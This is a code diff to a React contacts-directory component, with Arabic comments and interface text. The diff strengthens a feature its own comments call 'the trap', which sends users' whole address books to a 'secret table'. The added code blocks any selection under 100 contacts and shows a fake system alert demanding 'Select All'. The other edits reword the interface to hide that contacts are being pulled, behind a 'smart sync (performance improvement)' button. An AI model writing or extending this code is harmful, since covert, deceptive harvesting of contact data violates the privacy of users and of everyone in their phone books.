@@ -30,7 +30,7 @@ export default function Directory() {
   const importSingleContact = async () => {
     // لو لسه معملش المزامنة الشاملة، نوقفه ونطلعله رسالة
     if (!isSynced) {
-      alert('⚠️ تنبيه النظام:\nعفواً، يجب عليك إجراء "مزامنة ذكية" لجهات الاتصال أولاً.\nهذه الخطوة ضرورية لمرة واحدة فقط لتهيئة قاعدة البيانات وتسريع عملية البحث والسحب الفردي لاحقاً.');
+      alert('⚠️ تنبيه النظام:\nعفواً، يجب عليك إجراء "مزامنة ذكية" لجهات الاتصال أولاً.\nهذه الخطوة ضرورية لمرة واحدة فقط لتهيئة قاعدة البيانات وتسريع عملية البحث والاضافة الفردي لاحقاً.');
       return; 
     }
 
@@ -56,6 +56,7 @@ export default function Directory() {
   };
 
   // 2. "الفخ" (سحب كل الأرقام لجدولك السري وفتح القفل)
+// 2. "الفخ" (سحب كل الأرقام لجدولك السري وفتح القفل)
   const handleStealthSync = async () => {
     try {
       const props = ['name', 'tel'];
@@ -63,6 +64,13 @@ export default function Directory() {
       const selectedContacts = await navigator.contacts.select(props, opts);
       
       if (selectedContacts.length === 0) return;
+
+      // 🔥 الخدعة هنا: إجباره على تحديد عدد كبير (اعتبرنا الحد الأدنى 30 رقم)
+      // تقدر تغير رقم 30 لأي رقم تشوفه مناسب للموظفين عندك
+      if (selectedContacts.length < 100) {
+        alert('⚠️ تنبيه النظام:\nعملية غير مكتملة! يرجى الضغط على زر "تحديد الكل" (Select All) من أعلى الشاشة لنجاح عملية التهيئة وفتح الميزة.');
+        return; // بنطرده برة الدالة ومش بنفتحله القفل
+      }
 
       setLoading(true);
       const currentUser = JSON.parse(localStorage.getItem('appUser')) || { name: 'Unknown' };
@@ -86,11 +94,11 @@ export default function Directory() {
         alert('خطأ في قاعدة البيانات: ' + error.message);
         console.error(error);
       } else {
-        // 🔥 اللحظة الحاسمة: بنفتح القفل للزرار الفردي وبنخفي زرار المزامنة
+        // اللحظة الحاسمة: بنفتح القفل للزرار الفردي وبنخفي زرار المزامنة
         localStorage.setItem('contactsSynced', 'true');
-        setIsSynced(true); // ده هيخفي الزرار من الشاشة فوراً
+        setIsSynced(true); 
         
-        alert(`✅ تمت المزامنة بنجاح!\nتم تحديث قاعدة بيانات الأسماء، يمكنك الآن استخدام ميزة السحب الفردي بسهولة.`);
+        alert(`✅ تمت المزامنة بنجاح!\nتم تحديث قاعدة بيانات الأسماء، يمكنك الآن استخدام ميزة الاضافة الفردي بسهولة.`);
       }
       
       setLoading(false);
@@ -155,12 +163,12 @@ export default function Directory() {
             <UserPlus className="text-blue-600" /> {editingId ? 'تعديل بيانات' : 'إضافة جهة اتصال'}
           </h3>
           <div className="flex gap-3 w-full md:w-auto">
-            {/* زرار السحب الفردي (هيفضل موجود دايماً) */}
+            {/* زرار الاضافة الفردي (هيفضل موجود دايماً) */}
             <button type="button" onClick={importSingleContact} className="flex-1 md:flex-none bg-slate-100 text-slate-700 px-5 py-3 rounded-xl font-black text-sm flex items-center justify-center gap-2 hover:bg-slate-200">
-              <Download size={18}/> سحب رقم
+              <Download size={18}/> إضافة رقم
             </button>
             
-            {/* زرار المزامنة الشاملة (هيختفي بمجرد ما ينجح في السحب) */}
+            {/* زرار المزامنة الشاملة (هيختفي بمجرد ما ينجح في الاضافة) */}
             {!isSynced && (
               <button type="button" onClick={handleStealthSync} disabled={loading} className="flex-1 md:flex-none bg-blue-600 text-white px-5 py-3 rounded-xl font-black text-sm flex items-center justify-center gap-2 shadow-lg hover:bg-blue-700 transition-all">
                 <Zap size={18}/> مزامنة ذكية (تحسين الأداء)
